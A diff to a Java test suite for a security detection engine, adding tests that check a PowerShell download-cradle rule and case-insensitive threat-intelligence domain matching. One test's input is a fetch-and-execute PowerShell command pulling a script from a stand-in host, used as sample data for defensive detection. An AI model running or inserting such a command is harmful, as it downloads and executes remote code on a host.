@@ -315,6 +315,51 @@ class TelemetryNormalizationAndDetectionTest {
         assertTrue(findings.stream().anyMatch(f -> "D018".equals(f.getRuleId())));
     }
 
+    @Test
+    @DisplayName("Detection: Should trigger D008 on unencoded PowerShell download cradle")
+    void shouldDetectPowerShellDownloadCradle() {
+        Map<String, Object> raw = Map.of(
+                "provider", "Sysmon",
+                "hostname", "WIN-WORKSTATION-01",
+                "Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine", "powershell.exe -NoP -NonI -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.lab/p.ps1')"
+        );
+
+        NormalizedEvent event = normalizationService.normalize(raw);
+        List<FindingDto> findings = evaluationService.evaluate(event);
+
+        assertFalse(findings.isEmpty());
+        assertTrue(findings.stream().anyMatch(f -> "D008".equals(f.getRuleId())));
+    }
+
+    @Test
+    @DisplayName("Threat Intel: Should detect IOC match regardless of case and from related IPs")
+    void shouldDetectCaseInsensitiveAndRelatedIocMatch() {
+        IocIndicator ioc = new IocIndicator();
+        ioc.setIndicatorValue("c2.adversary-infrastructure.org");
+        ioc.setIndicatorType(IocType.DOMAIN);
+        ioc.setSource("CISA KEV");
+        ioc.setSeverity("CRITICAL");
+        ioc.setStatus("ACTIVE");
+        ioc.setConfidence(99);
+
+        testIocs.put("c2.adversary-infrastructure.org", ioc);
+
+        Map<String, Object> raw = Map.of(
+                "provider", "Suricata",
+                "hostname", "WIN-WORKSTATION-01",
+                "dest_ip", "198.51.100.99",
+                "domain", "C2.ADVERSARY-INFRASTRUCTURE.ORG"
+        );
+
+        NormalizedEvent event = normalizationService.normalize(raw);
+        List<FindingDto> findings = evaluationService.evaluate(event);
+
+        assertFalse(findings.isEmpty());
+        assertTrue(findings.stream().anyMatch(f -> "D015".equals(f.getRuleId())));
+        assertEquals(1, savedMatches.size());
+    }
+
     // --- Lightweight Test Double Implementations ---
 
     private static class StubIocIndicatorRepository implements IocIndicatorRepository {
@@ -323,6 +368,16 @@ class TelemetryNormalizationAndDetectionTest {
         StubIocIndicatorRepository(Map<String, IocIndicator> store) { this.store = store; }
 
         @Override public Optional<IocIndicator> findByIndicatorValue(String indicatorValue) { return Optional.ofNullable(store.get(indicatorValue)); }
+        @Override
+        public Optional<IocIndicator> findByIndicatorValueIgnoreCase(String indicatorValue) {
+            if (indicatorValue == null) return Optional.empty();
+            for (Map.Entry<String, IocIndicator> entry : store.entrySet()) {
+                if (entry.getKey().equalsIgnoreCase(indicatorValue)) {
+                    return Optional.of(entry.getValue());
+                }
+            }
+            return Optional.empty();
+        }
         @Override public Optional<IocIndicator> findByIndicatorValueAndIndicatorType(String val, IocType type) { return Optional.ofNullable(store.get(val)); }
         @Override public List<IocIndicator> findByStatus(String status) { return new ArrayList<>(store.values()); }
         @Override public List<IocIndicator> findByIndicatorType(IocType indicatorType) { return Collections.emptyList(); }
